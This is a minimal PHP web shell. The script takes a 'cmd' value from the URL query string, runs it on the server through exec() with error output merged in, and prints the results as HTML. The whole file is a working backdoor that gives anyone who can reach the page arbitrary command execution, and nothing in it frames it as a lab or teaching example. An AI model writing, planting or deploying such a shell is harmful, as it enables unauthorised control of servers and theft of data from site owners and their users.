<?php

if (!isset($_GET['cmd'])) {
    exit(0);
}
$cmd =  $_GET['cmd'] .' 2>&1';

echo "<html><pre><code style=\"font-family: Consolas, 'Courier New', Courier, Monaco, monospace;\">\n";
$output = array();
exec($cmd, $output);
foreach ($output as $line) {
    echo htmlspecialchars($line), '<br>';
}
echo "</code></pre></html>\n";
